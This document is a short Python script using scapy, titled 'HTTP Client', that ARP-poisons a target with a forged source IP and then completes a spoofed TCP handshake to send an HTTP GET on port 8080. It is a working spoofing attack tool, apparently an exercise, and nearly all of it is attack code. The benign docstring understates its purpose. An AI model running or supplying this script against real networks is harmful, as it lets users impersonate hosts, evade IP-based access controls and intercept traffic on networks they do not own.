#! /usr/bin/env python
""" HTTP Client """
import argparse
from scapy.all \
    import get_if_list, get_if_hwaddr, sr1, Ether, ARP, sendp, send
from scapy.layers.inet import IP, TCP

PORT = 8080


def main():
    """

    :return: void
    """
    # handle args
    parser = argparse.ArgumentParser()
    parser.add_argument('-src', help="Source IP")
    parser.add_argument('-dst', help="Destination IP")
    parser.add_argument('-msg', help="HTTP message")
    args = parser.parse_args()
    fake_src_ip = args.src
    dst_ip = args.dst
    http_get_msg = "GET / HTTP/1.1\r\n" + args.msg + "\r\n\r\n"

    # get my mac address
    my_mac = '00:00:00:00:00:00'
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for macs in my_macs:
        if macs != '00:00:00:00:00:00':
            my_mac = macs

    # Arp posion
    arp_psn = Ether() / ARP(op="who-has", hwsrc=my_mac,
                            pdst=dst_ip, psrc=fake_src_ip)
    sendp(arp_psn)

    # Hand Shake
    ip_layer = IP(src=fake_src_ip, dst=dst_ip)
    tcp_layer = TCP(dport=PORT, seq=100, flags='S')
    syn_pkg = ip_layer / tcp_layer
    syn_ack_pkg = sr1(syn_pkg)
    if syn_ack_pkg != 0:
        ip_layer = IP(src=fake_src_ip, dst=dst_ip)
        tcp_layer = TCP(dport=PORT, seq=syn_ack_pkg[TCP].ack,
                        ack=(syn_ack_pkg[TCP].seq + 1), flags='A')
        ack_pkg = ip_layer / tcp_layer
        send(ack_pkg)
        ack_pkg /= http_get_msg
        send(ack_pkg)


if __name__ == '__main__':
    main()
